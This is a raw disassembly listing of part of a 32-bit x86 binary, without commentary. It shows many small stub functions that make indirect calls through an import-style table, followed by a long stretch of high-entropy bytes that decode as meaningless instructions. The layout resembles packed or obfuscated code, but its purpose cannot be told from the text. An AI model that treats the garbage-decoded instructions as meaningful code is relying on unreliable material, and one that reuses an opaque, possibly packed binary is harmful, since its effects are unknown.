  4019c1:	add    esp,0xc
  4019c4:	pop    edx
  4019c5:	push   edx
  4019c6:	push   0x0
  4019c8:	push   0x403070
  4019cd:	pop    eax
  4019ce:	call   DWORD PTR cs:[eax]
  4019d1:	pop    edx
  4019d2:	sub    esp,0xffffffb0
  4019d5:	mov    ebp,DWORD PTR [esp]
  4019d8:	add    esp,0x4
  4019db:	ret    
  4019dc:	add    BYTE PTR [eax],al
  4019de:	add    BYTE PTR [eax],al
  4019e0:	mov    edi,edi
  4019e2:	push   ebp
  4019e3:	mov    ebp,esp
  4019e5:	sub    esp,0x48
  4019e8:	push   edx
  4019e9:	push   edi
  4019ea:	push   DWORD PTR [edx+0x490]
  4019f0:	push   DWORD PTR [edx+0x50c]
  4019f6:	push   esi
  4019f7:	call   0x40170c
  4019fc:	add    esp,0x10
  4019ff:	pop    edx
  401a00:	push   edx
  401a01:	push   0x0
  401a03:	push   0x403084
  401a08:	pop    eax
  401a09:	call   DWORD PTR cs:[eax]
  401a0c:	pop    edx
  401a0d:	push   edx
  401a0e:	push   0x0
  401a10:	push   0x403070
  401a15:	pop    eax
  401a16:	call   DWORD PTR cs:[eax]
  401a19:	pop    edx
  401a1a:	sub    esp,0xffffffb8
  401a1d:	mov    ebp,DWORD PTR [esp]
  401a20:	add    esp,0x4
  401a23:	ret    
  401a24:	mov    edi,edi
  401a26:	push   ebp
  401a27:	mov    ebp,esp
  401a29:	sub    esp,0x20
  401a2c:	push   edx
  401a2d:	push   DWORD PTR [edx+0x108]
  401a33:	push   ebx
  401a34:	push   ecx
  401a35:	push   DWORD PTR [edx+0x538]
  401a3b:	call   0x401284
  401a40:	add    esp,0x10
  401a43:	pop    edx
  401a44:	push   edx
  401a45:	push   0x0
  401a47:	push   0x403040
  401a4c:	pop    eax
  401a4d:	call   DWORD PTR cs:[eax]
  401a50:	pop    edx
  401a51:	push   edx
  401a52:	push   0x0
  401a54:	push   0x40306c
  401a59:	pop    eax
  401a5a:	call   DWORD PTR cs:[eax]
  401a5d:	pop    edx
  401a5e:	sub    esp,0xffffffe0
  401a61:	mov    ebp,DWORD PTR [esp]
  401a64:	add    esp,0x4
  401a67:	ret    
  401a68:	mov    edi,edi
  401a6a:	push   ebp
  401a6b:	mov    ebp,esp
  401a6d:	sub    esp,0x1c
  401a70:	push   edx
  401a71:	push   DWORD PTR [edx+0x364]
  401a77:	push   DWORD PTR [edx+0x1a8]
  401a7d:	push   DWORD PTR [edx+0xa8]
  401a83:	call   0x4016bc
  401a88:	add    esp,0xc
  401a8b:	pop    edx
  401a8c:	push   edx
  401a8d:	mov    eax,0x0
  401a92:	push   eax
  401a93:	push   0x403040
  401a98:	pop    eax
  401a99:	call   DWORD PTR cs:[eax]
  401a9c:	pop    edx
  401a9d:	push   edx
  401a9e:	push   0x0
  401aa0:	push   0x40306c
  401aa5:	pop    eax
  401aa6:	call   DWORD PTR cs:[eax]
  401aa9:	pop    edx
  401aaa:	sub    esp,0xffffffe4
  401aad:	mov    ebp,DWORD PTR [esp]
  401ab0:	add    esp,0x4
  401ab3:	ret    
	...
  401abc:	mov    edi,edi
  401abe:	push   ebp
  401abf:	mov    ebp,esp
  401ac1:	sub    esp,0x60
  401ac4:	push   edx
  401ac5:	mov    eax,0x0
  401aca:	push   eax
  401acb:	push   0x403024
  401ad0:	pop    eax
  401ad1:	call   DWORD PTR cs:[eax]
  401ad4:	pop    edx
  401ad5:	push   edx
  401ad6:	push   DWORD PTR [edx+0x2ac]
  401adc:	push   DWORD PTR [edx+0x98]
  401ae2:	push   edi
  401ae3:	push   ecx
  401ae4:	call   0x401dcc
  401ae9:	add    esp,0x10
  401aec:	pop    edx
  401aed:	push   edx
  401aee:	push   0x0
  401af0:	push   0x403084
  401af5:	pop    eax
  401af6:	call   DWORD PTR cs:[eax]
  401af9:	pop    edx
  401afa:	sub    esp,0xffffffa0
  401afd:	mov    ebp,DWORD PTR [esp]
  401b00:	add    esp,0x4
  401b03:	ret    
  401b04:	mov    edi,edi
  401b06:	push   ebp
  401b07:	mov    ebp,esp
  401b09:	sub    esp,0x28
  401b0c:	push   edx
  401b0d:	push   DWORD PTR [edx+0x5ac]
  401b13:	push   DWORD PTR [edx+0x5fc]
  401b19:	call   0x4015a0
  401b1e:	add    esp,0x8
  401b21:	pop    edx
  401b22:	push   edx
  401b23:	mov    edi,0x0
  401b28:	push   edi
  401b29:	push   0x40306c
  401b2e:	pop    eax
  401b2f:	call   DWORD PTR cs:[eax]
  401b32:	pop    edx
  401b33:	push   edx
  401b34:	mov    edx,0x0
  401b39:	push   edx
  401b3a:	push   0x40300c
  401b3f:	pop    eax
  401b40:	call   DWORD PTR cs:[eax]
  401b43:	pop    edx
  401b44:	sub    esp,0xffffffd8
  401b47:	mov    ebp,DWORD PTR [esp]
  401b4a:	add    esp,0x4
  401b4d:	ret    
  401b4e:	add    BYTE PTR [eax],al
  401b50:	mov    edi,edi
  401b52:	push   ebp
  401b53:	mov    ebp,esp
  401b55:	sub    esp,0x4c
  401b58:	push   edx
  401b59:	push   DWORD PTR [edx+0x230]
  401b5f:	push   DWORD PTR [edx+0x550]
  401b65:	call   0x401004
  401b6a:	add    esp,0x8
  401b6d:	pop    edx
  401b6e:	push   edx
  401b6f:	push   0x0
  401b71:	push   0x403044
  401b76:	pop    eax
  401b77:	call   DWORD PTR cs:[eax]
  401b7a:	pop    edx
  401b7b:	push   edx
  401b7c:	push   0x403018
  401b81:	pop    eax
  401b82:	call   DWORD PTR cs:[eax]
  401b85:	pop    edx
  401b86:	sub    esp,0xffffffb4
  401b89:	mov    ebp,DWORD PTR [esp]
  401b8c:	add    esp,0x4
  401b8f:	ret    
  401b90:	add    BYTE PTR [eax],al
  401b92:	add    BYTE PTR [eax],al
  401b94:	mov    edi,edi
  401b96:	push   ebp
  401b97:	mov    ebp,esp
  401b99:	sub    esp,0x3c
  401b9c:	push   edx
  401b9d:	push   ecx
  401b9e:	push   ebx
  401b9f:	push   esi
  401ba0:	push   DWORD PTR [edx+0x250]
  401ba6:	call   0x401a68
  401bab:	add    esp,0x10
  401bae:	pop    edx
  401baf:	push   edx
  401bb0:	mov    esi,0x0
  401bb5:	push   esi
  401bb6:	push   0x40306c
  401bbb:	pop    eax
  401bbc:	call   DWORD PTR cs:[eax]
  401bbf:	pop    edx
  401bc0:	push   edx
  401bc1:	lea    eax,[edx]
  401bc3:	push   eax
  401bc4:	push   0x403034
  401bc9:	pop    eax
  401bca:	call   DWORD PTR cs:[eax]
  401bcd:	test   eax,eax
  401bcf:	jne    0x401bc1
  401bd1:	pop    edx
  401bd2:	sub    esp,0xffffffc4
  401bd5:	mov    ebp,DWORD PTR [esp]
  401bd8:	add    esp,0x4
  401bdb:	ret    
  401bdc:	mov    edi,edi
  401bde:	push   ebp
  401bdf:	mov    ebp,esp
  401be1:	sub    esp,0x38
  401be4:	push   edx
  401be5:	push   0x0
  401be7:	push   0x403014
  401bec:	pop    eax
  401bed:	call   DWORD PTR cs:[eax]
  401bf0:	pop    edx
  401bf1:	push   edx
  401bf2:	push   ebx
  401bf3:	push   eax
  401bf4:	push   DWORD PTR [edx+0x3c]
  401bf7:	call   0x4014a4
  401bfc:	add    esp,0xc
  401bff:	pop    edx
  401c00:	push   edx
  401c01:	push   0x0
  401c03:	push   0x403014
  401c08:	pop    eax
  401c09:	call   DWORD PTR cs:[eax]
  401c0c:	pop    edx
  401c0d:	sub    esp,0xffffffc8
  401c10:	mov    ebp,DWORD PTR [esp]
  401c13:	add    esp,0x4
  401c16:	ret    
  401c17:	add    BYTE PTR [ebx-0x1374aa01],cl
  401c1d:	sub    esp,0x54
  401c20:	push   edx
  401c21:	push   DWORD PTR [edx+0x430]
  401c27:	push   esi
  401c28:	push   DWORD PTR [edx+0x1e8]
  401c2e:	push   DWORD PTR [edx+0x90]
  401c34:	call   0x401534
  401c39:	add    esp,0x10
  401c3c:	pop    edx
  401c3d:	push   edx
  401c3e:	push   0x403038
  401c43:	pop    eax
  401c44:	call   DWORD PTR cs:[eax]
  401c47:	pop    edx
  401c48:	push   edx
  401c49:	lea    edx,[edx]
  401c4b:	push   edx
  401c4c:	push   0x403034
  401c51:	pop    eax
  401c52:	call   DWORD PTR cs:[eax]
  401c55:	test   eax,eax
  401c57:	jne    0x401c49
  401c59:	pop    edx
  401c5a:	sub    esp,0xffffffac
  401c5d:	mov    ebp,DWORD PTR [esp]
  401c60:	add    esp,0x4
  401c63:	ret    
  401c64:	mov    edi,edi
  401c66:	push   ebp
  401c67:	mov    ebp,esp
  401c69:	sub    esp,0x30
  401c6c:	push   edx
  401c6d:	push   0x0
  401c6f:	push   0x403000
  401c74:	pop    eax
  401c75:	call   DWORD PTR cs:[eax]
  401c78:	pop    edx
  401c79:	push   edx
  401c7a:	push   DWORD PTR [edx+0x294]
  401c80:	push   DWORD PTR [edx+0x20]
  401c83:	push   edi
  401c84:	push   DWORD PTR [edx+0x2b8]
  401c8a:	call   0x4018c0
  401c8f:	add    esp,0x10
  401c92:	pop    edx
  401c93:	push   edx
  401c94:	lea    edx,[edx]
  401c96:	push   edx
  401c97:	push   0x403034
  401c9c:	pop    eax
  401c9d:	call   DWORD PTR cs:[eax]
  401ca0:	test   eax,eax
  401ca2:	jne    0x401c94
  401ca4:	pop    edx
  401ca5:	sub    esp,0xffffffd0
  401ca8:	mov    ebp,DWORD PTR [esp]
  401cab:	add    esp,0x4
  401cae:	ret    
	...
  401cbb:	add    BYTE PTR [ebx-0x1374aa01],cl
  401cc1:	sub    esp,0x44
  401cc4:	push   edx
  401cc5:	push   0x0
  401cc7:	push   0x403008
  401ccc:	pop    eax
  401ccd:	call   DWORD PTR cs:[eax]
  401cd0:	pop    edx
  401cd1:	push   edx
  401cd2:	push   DWORD PTR [edx+0xac]
  401cd8:	push   ebx
  401cd9:	push   ecx
  401cda:	call   0x401758
  401cdf:	add    esp,0xc
  401ce2:	pop    edx
  401ce3:	push   edx
  401ce4:	mov    edx,0x0
  401ce9:	push   edx
  401cea:	push   0x403014
  401cef:	pop    eax
  401cf0:	call   DWORD PTR cs:[eax]
  401cf3:	pop    edx
  401cf4:	sub    esp,0xffffffbc
  401cf7:	mov    ebp,DWORD PTR [esp]
  401cfa:	add    esp,0x4
  401cfd:	ret    
  401cfe:	add    BYTE PTR [eax],al
  401d00:	add    BYTE PTR [eax],al
  401d02:	add    BYTE PTR [eax],al
  401d04:	mov    edi,edi
  401d06:	push   ebp
  401d07:	mov    ebp,esp
  401d09:	sub    esp,0x34
  401d0c:	push   edx
  401d0d:	mov    edx,0x0
  401d12:	push   edx
  401d13:	push   0x403084
  401d18:	pop    eax
  401d19:	call   DWORD PTR cs:[eax]
  401d1c:	pop    edx
  401d1d:	push   edx
  401d1e:	push   ebx
  401d1f:	push   DWORD PTR [edx+0x2d8]
  401d25:	push   ecx
  401d26:	call   0x4019e0
  401d2b:	add    esp,0xc
  401d2e:	pop    edx
  401d2f:	push   edx
  401d30:	push   0x403038
  401d35:	pop    eax
  401d36:	call   DWORD PTR cs:[eax]
  401d39:	pop    edx
  401d3a:	sub    esp,0xffffffcc
  401d3d:	mov    ebp,DWORD PTR [esp]
  401d40:	add    esp,0x4
  401d43:	ret    
  401d44:	mov    edi,edi
  401d46:	push   ebp
  401d47:	mov    ebp,esp
  401d49:	sub    esp,0x60
  401d4c:	push   edx
  401d4d:	push   0x0
  401d4f:	push   0x403014
  401d54:	pop    eax
  401d55:	call   DWORD PTR cs:[eax]
  401d58:	pop    edx
  401d59:	push   edx
  401d5a:	push   ecx
  401d5b:	push   DWORD PTR [edx+0x184]
  401d61:	push   ecx
  401d62:	push   eax
  401d63:	call   0x401414
  401d68:	add    esp,0x10
  401d6b:	pop    edx
  401d6c:	push   edx
  401d6d:	push   0x0
  401d6f:	push   0x403000
  401d74:	pop    eax
  401d75:	call   DWORD PTR cs:[eax]
  401d78:	pop    edx
  401d79:	sub    esp,0xffffffa0
  401d7c:	mov    ebp,DWORD PTR [esp]
  401d7f:	add    esp,0x4
  401d82:	ret    
  401d83:	add    BYTE PTR [ebx-0x1374aa01],cl
  401d89:	sub    esp,0x2c
  401d8c:	push   edx
  401d8d:	mov    esi,0x0
  401d92:	push   esi
  401d93:	push   0x403014
  401d98:	pop    eax
  401d99:	call   DWORD PTR cs:[eax]
  401d9c:	pop    edx
  401d9d:	push   edx
  401d9e:	push   DWORD PTR [edx+0x184]
  401da4:	push   ecx
  401da5:	call   0x401d44
  401daa:	add    esp,0x8
  401dad:	pop    edx
  401dae:	push   edx
  401daf:	mov    edx,0x0
  401db4:	push   edx
  401db5:	push   0x40306c
  401dba:	pop    eax
  401dbb:	call   DWORD PTR cs:[eax]
  401dbe:	pop    edx
  401dbf:	sub    esp,0xffffffd4
  401dc2:	mov    ebp,DWORD PTR [esp]
  401dc5:	add    esp,0x4
  401dc8:	ret    
  401dc9:	add    BYTE PTR [eax],al
  401dcb:	add    BYTE PTR [ebx-0x1374aa01],cl
  401dd1:	sub    esp,0x28
  401dd4:	push   edx
  401dd5:	mov    eax,0x0
  401dda:	push   eax
  401ddb:	push   0x403040
  401de0:	pop    eax
  401de1:	call   DWORD PTR cs:[eax]
  401de4:	pop    edx
  401de5:	push   edx
  401de6:	push   DWORD PTR [edx+0xf8]
  401dec:	push   DWORD PTR [edx+0x37c]
  401df2:	call   0x401238
  401df7:	add    esp,0x8
  401dfa:	pop    edx
  401dfb:	push   edx
  401dfc:	mov    eax,0x0
  401e01:	push   eax
  401e02:	push   0x403044
  401e07:	pop    eax
  401e08:	call   DWORD PTR cs:[eax]
  401e0b:	pop    edx
  401e0c:	sub    esp,0xffffffd8
  401e0f:	mov    ebp,DWORD PTR [esp]
  401e12:	add    esp,0x4
  401e15:	ret    
  401e16:	add    BYTE PTR [eax],al
  401e18:	add    BYTE PTR [eax],al
  401e1a:	add    BYTE PTR [eax],al
  401e1c:	mov    edi,edi
  401e1e:	push   ebp
  401e1f:	mov    ebp,esp
  401e21:	sub    esp,0x34
  401e24:	push   edx
  401e25:	push   ebx
  401e26:	push   DWORD PTR [edx+0x3f8]
  401e2c:	push   eax
  401e2d:	call   0x401794
  401e32:	add    esp,0xc
  401e35:	pop    edx
  401e36:	push   edx
  401e37:	push   0x0
  401e39:	push   0x403070
  401e3e:	pop    eax
  401e3f:	call   DWORD PTR cs:[eax]
  401e42:	pop    edx
  401e43:	push   edx
  401e44:	mov    eax,0x0
  401e49:	push   eax
  401e4a:	push   0x403084
  401e4f:	pop    eax
  401e50:	call   DWORD PTR cs:[eax]
  401e53:	pop    edx
  401e54:	sub    esp,0xffffffcc
  401e57:	mov    ebp,DWORD PTR [esp]
  401e5a:	add    esp,0x4
  401e5d:	ret    
  401e5e:	add    BYTE PTR [eax],al
  401e60:	imul   esi,DWORD PTR [ecx+eiz*1+0x53],0xfffffff8
  401e65:	cmc    
  401e66:	cdq    
  401e67:	inc    esp
  401e68:	out    0x58,al
  401e6a:	ret    0x6558
  401e6d:	jb     0x401ebf
  401e6f:	pop    eax
  401e70:	fisub  DWORD PTR [esi+0x5b]
  401e73:	(bad)  
  401e74:	je     0x401df8
  401e76:	add    eax,0xc80f1ae9
  401e7b:	std    
  401e7c:	out    dx,eax
  401e7d:	sahf   
  401e7e:	mov    ecx,0xc7c70097
  401e83:	add    DWORD PTR [eax],eax
  401e85:	mov    edi,0xc6e30001
  401e8b:	jg     0x401ece
  401e8d:	retf   0xa27e
  401e90:	mov    ebp,0x310580a8
  401e95:	imul   esi,eax,0xffffffe2
  401e98:	add    DWORD PTR ds:0x251691a3,ecx
  401e9e:	gs ins BYTE PTR es:[edi],dx
  401ea0:	pop    eax
  401ea1:	push   edi
  401ea2:	inc    eax
  401ea3:	push   ss
  401ea4:	or     DWORD PTR [edx+0x32],eax
  401ea7:	imul   ecx,DWORD PTR [ecx],0xffffffff
  401eaa:	mov    edx,0xbcd552e7
  401eaf:	ins    BYTE PTR es:[edi],dx
  401eb0:	mov    esi,0x81d8533b
  401eb5:	push   esp
  401eb6:	js     0x401eaf
  401eb8:	pop    edx
  401eb9:	call   0xf444a4ae
  401ebe:	mov    ch,0xa0
  401ec0:	jge    0x401ea6
  401ec2:	adc    BYTE PTR [eax],al
  401ec4:	add    DWORD PTR [eax],edx
  401ec6:	adc    al,0x1d
  401ec8:	sbb    ebp,DWORD PTR [edi+0x468a0000]
  401ece:	(bad)  
  401ecf:	adc    BYTE PTR [esi+edx*4],dl
  401ed2:	and    eax,0x60f2ae1
  401ed7:	call   0x3110:0x20092406
  401ede:	sbb    edx,DWORD PTR [edi+0x76dd5ba9]
  401ee4:	ins    DWORD PTR es:[edi],dx
  401ee5:	mov    DWORD PTR [eax+0x13],esp
  401ee8:	xor    eax,0x2102650d
  401eed:	add    BYTE PTR [edx+eax*1],al
  401ef0:	and    eax,0x5c1d9a32
  401ef5:	jbe    0x401f0c
  401ef7:	push   eax
  401ef8:	add    BYTE PTR [edx+0x702b6291],0xc4
  401eff:	xchg   ebx,eax
  401f00:	adc    DWORD PTR [eax],eax
  401f02:	add    al,ah
  401f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f05:	push   0xff6b6a00
  401f0a:	push   ebp
  401f0b:	push   ss
  401f0c:	pushf  
  401f0d:	lods   eax,DWORD PTR ds:[esi]
  401f0e:	cli    
  401f0f:	cdq    
  401f10:	cwde   
  401f11:	add    eax,0xb5dedbf8
  401f16:	aam    0xf9
  401f18:	stc    
  401f19:	aam    0xf
  401f1b:	sub    eax,0xcffb9a7
  401f20:	push   esi
  401f21:	ret    
  401f22:	call   0xc428acb4
  401f27:	stc    
  401f28:	add    al,BYTE PTR [edi-0x238cdecc]
  401f2e:	jl     0x401f8a
  401f30:	add    eax,0x3f6f00fb
  401f35:	call   0x6ab2aa3a
  401f3a:	add    BYTE PTR [edi+0x6b],ch
  401f3d:	call   FWORD PTR [edi]
  401f3f:	pushf  
  401f40:	cmp    al,0x8a
  401f42:	stos   BYTE PTR es:[edi],al
  401f43:	sub    BYTE PTR [eax+ebx*1+0x3c6b3d97],ah
  401f4a:	adc    eax,0x47cca74
  401f4f:	push   ecx
  401f50:	push   es
  401f51:	pop    es
  401f52:	(bad)  [ecx+0x78]
  401f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f56:	add    BYTE PTR [ecx-0x364fb057],ch
  401f5c:	loope  0x401f46
  401f5e:	sbb    dh,bl
  401f60:	int3   
  401f61:	cmp    al,0x8d
  401f63:	pop    es
  401f64:	add    ebp,ebx
  401f66:	retf   
  401f67:	push   es
  401f68:	push   edi
  401f69:	test   DWORD PTR [esi+0x73],0x22581962
  401f70:	inc    ecx
  401f71:	dec    ecx
  401f72:	mov    dl,0x4e
  401f74:	ins    DWORD PTR es:[edi],dx
  401f75:	loope  0x401f8c
  401f77:	sbb    al,0x69
  401f79:	xor    al,0x6a
  401f7b:	xor    al,0x0
  401f7d:	jno    0x401fdf
  401f7f:	push   ebx
  401f80:	push   ebx
  401f81:	push   es
  401f82:	pusha  
  401f83:	je     0x401f7a
  401f85:	jl     0x401f8c
  401f87:	stos   DWORD PTR es:[edi],eax
  401f88:	aas    
  401f89:	push   esp
  401f8a:	cmp    ebp,DWORD PTR [esi]
  401f8c:	push   ebx
  401f8d:	add    DWORD PTR [eax],ecx
  401f8f:	ds aas 
  401f91:	push   cs
  401f92:	add    ch,BYTE PTR [esp+eax*1+0x77e1cddc]
  401f99:	cmp    al,0x2f
  401f9b:	or     BYTE PTR [esi-0xe],bl
  401f9e:	jmp    DWORD PTR [ebx-0x49a93d2c]
  401fa4:	je     0x401f34
  401fa6:	mov    bh,0x93
  401fa8:	xchg   esp,eax
  401fa9:	lods   eax,DWORD PTR cs:[esi]
  401fab:	xor    esi,DWORD PTR [edi-0x577bc9f]
  401fb1:	sbb    esi,esi
  401fb3:	dec    BYTE PTR [esi-0x29]
  401fb6:	test   BYTE PTR [edi+0x72a00e52],bh
  401fbc:	ss dec ebx
  401fbe:	ret    0x8e1c
  401fc1:	xchg   edi,edi
  401fc3:	jnp    0x401f98
  401fc5:	out    0xc4,eax
  401fc7:	test   DWORD PTR [ecx],eax
  401fc9:	(bad)  
  401fca:	pop    ebx
  401fcb:	arpl   bx,ax
  401fcd:	in     al,dx
  401fce:	arpl   WORD PTR [ebp+0x76],si
  401fd1:	call   0x14bb63fa
  401fd6:	push   DWORD PTR [ebp+0x66]
  401fd9:	je     0x402046
  401fdb:	jnp    0x401fe5
  401fdd:	test   al,dl
  401fdf:	inc    eax
  401fe0:	fmul   QWORD PTR [edi+0x50253a9]
  401fe6:	test   ecx,ebx
  401fe8:	cmp    DWORD PTR [ebp+0x6],edx
  401feb:	push   es
  401fec:	push   edi
  401fed:	pop    es
  401fee:	or     BYTE PTR [ebx],dh
  401ff0:	ins    DWORD PTR es:[edi],dx
  401ff1:	int3   
  401ff2:	add    cl,BYTE PTR [eax+ebx*2]
  401ff5:	or     BYTE PTR [ebx-0x8],cl
  401ff8:	aas    
  401ff9:	das    
  401ffa:	mov    al,ds:0xc5a758ff
  401fff:	jo     0x40204c
  402001:	dec    ecx
  402002:	mov    edx,0x29e958bd
  402007:	mov    DWORD PTR [ecx],0x1e88ae9
  40200d:	xor    DWORD PTR [eax+0x186968],0x28760000
  402017:	push   esi
  402018:	ficom  DWORD PTR [ebx-0x78e6f002]
  40201e:	dec    DWORD PTR [ebx-0x220c9fff]
  402024:	add    al,0xff
  402026:	add    BYTE PTR fs:[ecx-0x75],bl
  40202a:	inc    eax
  40202b:	cmp    al,0x80
  40202d:	add    BYTE PTR [edi+0x34146061],al
  402033:	(bad)
  402037:	scas   eax,DWORD PTR es:[edi]
  402038:	jnp    0x402021
  40203a:	and    al,0x88
  40203c:	dec    ecx
  40203d:	sbb    BYTE PTR [edi-0x3477a706],al
  402043:	shl    al,0xef
  402046:	mov    bl,BYTE PTR [eax+0x6d]
  402049:	out    dx,eax
  40204a:	out    dx,eax
  40204b:	cmp    DWORD PTR [esi-0x9],edx
  40204e:	inc    esi
  40204f:	imul   edi,DWORD PTR [eax+0x44],0xa1190ea1
  402056:	fs xchg edx,ecx
  402059:	xor    BYTE PTR [ecx+0x65767178],cl
  40205f:	push   esp
  402060:	std    
  402061:	jbe    0x402060
  402063:	or     BYTE PTR [ecx],al
  402065:	pop    edi
  402066:	jmp    0x7e1c:0x79bdd2b0
  40206d:	je     0x40200b
  40206f:	mov    dh,0x3a
  402071:	call   0x791a59c6
  402076:	pop    eax
  402077:	add    al,0x3
  402079:	pop    eax
  40207a:	js     0x402070
  40207c:	mov    eax,DWORD PTR gs:[esi+eiz*1]
  402080:	in     al,dx
  402081:	add    BYTE PTR [edi+0x424010f],ch
  402087:	cmp    BYTE PTR [edx+0x64500424],cl
  40208d:	(bad)  
  40208e:	out    0x14,eax
  402090:	in     al,dx
  402091:	xor    bl,al
  402093:	inc    ebp
  402094:	dec    ebx
  402095:	mov    BYTE PTR [ebp+0xb],al
  402098:	xor    DWORD PTR [esi+0x7472b98b],0xf8f70373
  4020a2:	or     bh,dl
  4020a4:	mov    al,BYTE PTR [ecx-0x70916601]
  4020aa:	test   al,0x7a
  4020ac:	test   eax,0xb6c37e53
  4020b1:	adc    DWORD PTR [ebx-0x56],0x235457a9
  4020b8:	fisub  DWORD PTR [esi]
  4020ba:	adc    BYTE PTR [esi-0x9],dl
  4020bd:	fwait
  4020be:	mov    BYTE PTR [esi],ah
  4020c0:	sub    edi,DWORD PTR [esi]
  4020c2:	dec    BYTE PTR [eax]
  4020c4:	xlat   BYTE PTR ds:[ebx]
  4020c5:	or     BYTE PTR [ebx+0x4b],0x91
  4020c9:	fisub  DWORD PTR [edi+0x543f7f]
  4020cf:	or     DWORD PTR [edi+0x7],edx
  4020d2:	or     BYTE PTR [edx+ebx*8],bh
  4020d5:	or     dl,al
  4020d7:	aas    
  4020d8:	push   ecx
  4020d9:	adc    eax,0x657cd8d
  4020de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020df:	xchg   ebx,eax
  4020e0:	pop    ebx
  4020e1:	cdq    
  4020e2:	or     al,dl
  4020e4:	mov    ch,0x9e
  4020e6:	add    al,0x57
  4020e8:	add    DWORD PTR [ecx+0xd70019b],ebp
  4020ee:	inc    esp
  4020ef:	add    eax,DWORD PTR [eax]
  4020f1:	popa   
  4020f2:	jb     0x4020ef
  4020f4:	(bad)  
  4020f5:	jg     0x40216c
  4020f7:	std    
  4020f8:	mov    dh,BYTE PTR [ebx+ebp*2+0x0]
  4020fc:	test   eax,0xa9f8f1c
  402101:	hlt    
  402102:	push   esi
  402103:	or     eax,0xb10f0a02
  402108:	or     DWORD PTR [edi-0x29aaaaff],ebp
  40210e:	cmp    DWORD PTR [ebx-0x8],eax
  402111:	dec    ecx
  402112:	loop   0x4020af
  402114:	mov    ds:0x78605cea,al
  402119:	sar    ch,1
  40211b:	pop    esp
  40211c:	adc    BYTE PTR [eax],ah
  40211e:	aaa    
  40211f:	ja     0x402177
  402121:	cmp    edx,edx
  402123:	mov    esi,0x590f8494
  402128:	add    al,0xa4
  40212a:	add    BYTE PTR [eax],al
  40212c:	add    DWORD PTR [ebx-0x495ed1ee],ecx
  402132:	mov    eax,DWORD PTR [ebp-0x7e7bf08e]
  402138:	add    BYTE PTR [edi+ecx*1-0x7452080b],0xf8
  402140:	cld    
  402141:	jo     0x402140
  402143:	js     0x402193
  402145:	add    BYTE PTR [edx+0x543b0351],ch
  40214b:	lods   al,BYTE PTR ds:[esi]
  40214c:	imul   edx,DWORD PTR [edx+ebp*2],0xf8835850
  402153:	add    al,0x55
  402155:	add    BYTE PTR [edi+0x6a14693f],0x50
  40215c:	pop    eax
  40215d:	adc    DWORD PTR [esp],0x57811425
  402164:	add    BYTE PTR [esi+0x1c],dl
  402167:	jmp    FWORD PTR [ecx-0x859f100]
  40216d:	jno    0x402133
  40216f:	add    al,0xdd
  402171:	add    dl,bh
  402173:	inc    esp
  402174:	ins    DWORD PTR es:[edi],dx
  402175:	cmp    ah,cl
  402177:	mov    eax,0xe54462f2
  40217c:	int3   
  40217d:	lods   eax,DWORD PTR ds:[esi]
  40217e:	push   esi
  40217f:	mov    ah,0x7d
  402181:	adc    eax,0xff0ea6ff
  402186:	and    al,0x1c
  402188:	sbb    al,0xe3
  40218a:	out    dx,al
  40218b:	pop    ecx
  40218c:	xlat   BYTE PTR ds:[ebx]
  40218d:	stos   BYTE PTR es:[edi],al
  40218e:	mov    BYTE PTR [ebx],0x56
  402191:	jbe    0x4021a7
  402193:	jb     0x402163
  402195:	cmp    BYTE PTR [edx+0x41],dl
  402198:	adc    DWORD PTR [eax],eax
  40219a:	aas    
  40219b:	mov    bl,0x6a
  40219d:	push   ebx
  40219e:	push   eax
  40219f:	dec    esi
  4021a1:	cmp    BYTE PTR [eax+edi*8],al
  4021a4:	adc    DWORD PTR [eax],eax
  4021a6:	aas    
  4021a7:	mov    cl,0x84
  4021a9:	jae    0x4021ab
  4021ab:	adc    BYTE PTR [ecx],dl
  4021ad:	add    bl,bl
  4021af:	push   ecx
  4021b0:	pop    eax
  4021b1:	add    BYTE PTR [ebp+0xc],dl
  4021b4:	push   edi
  4021b5:	or     al,0xa7
  4021b7:	push   esp
  4021b8:	ficom  WORD PTR [ecx-0x491c24d4]
  4021be:	test   eax,0x21cde36e
  4021c3:	pushf  
  4021c4:	jae    0x40219c
  4021c6:	scas   al,BYTE PTR es:[edi]
  4021c7:	les    ecx,FWORD PTR [edi-0x15]
  4021ca:	mov    edi,0xe89b497e
  4021cf:	mov    eax,DWORD PTR [ecx]
  4021d1:	call   0xec3f68d1
  4021d6:	push   edx
  4021d7:	pop    ds
  4021d8:	push   ds
  4021d9:	mov    ecx,0xff0a17ff
  4021de:	(bad)  
  4021df:	jmp    FWORD PTR [eax+0x1e1f846]
  4021e5:	pop    es
  4021e6:	push   ecx
  4021e7:	adc    dh,0xe8
  4021ea:	add    BYTE PTR [edx+ebx*2-0x6124348c],cl
  4021f1:	cmp    eax,0xe801d08b
  4021f6:	into   
  4021f7:	inc    esi
  4021f8:	inc    edi
  4021fa:	fs (bad) 
  4021fc:	jb     0x40223f
  4021fe:	pop    ss
  4021ff:	inc    ecx
  402200:	mov    esi,0xf2bfcae8
  402205:	scas   eax,DWORD PTR es:[edi]
  402206:	ds aaa 
  402208:	rol    BYTE PTR [eax],0x54
  40220b:	in     al,0x2a
  40220d:	add    eax,0x808923c5
  402212:	sar    DWORD PTR [eax-0x79],0x98
  402216:	cvtdq2ps xmm1,xmm3
  402219:	dec    esi
  40221a:	sub    al,0xf2
  40221c:	dec    eax
  40221d:	add    DWORD PTR [eax],ebx
  40221f:	mov    al,0xbe
  402221:	stc    
  402222:	int3   
  402223:	inc    eax
  402224:	or     edi,DWORD PTR [ecx-0x8123dc]
  40222a:	(bad)  
  40222b:	(bad)  
  40222c:	out    dx,eax
  40222d:	dec    eax
  40222e:	repz ret 
  402230:	or     DWORD PTR [ebp+0xe],ebx
  402233:	pop    es
  402234:	or     DWORD PTR [ecx-0x9149af],edi
  40223a:	(bad)  
  40223b:	jmp    DWORD PTR [ebp-0x857fe9]
  402241:	jg     0x4022a5
  402243:	sub    eax,0x3c9e9551
  402248:	xchg   ecx,eax
  402249:	mov    al,ds:0xc8a739f4
  40224e:	rcl    DWORD PTR [ecx+0x1],0x48
  402252:	push   esp
  402253:	mov    DWORD PTR [edx+0x1004876],ecx
  402259:	dec    eax
  40225a:	jbe    0x4021ed
  40225c:	xchg   edx,eax
  40225d:	push   esp
  40225e:	dec    eax
  40225f:	add    BYTE PTR [ecx],al
  402261:	dec    eax
  402262:	push   esp
  402263:	cdq    
  402264:	call   0x7048:0x1004870
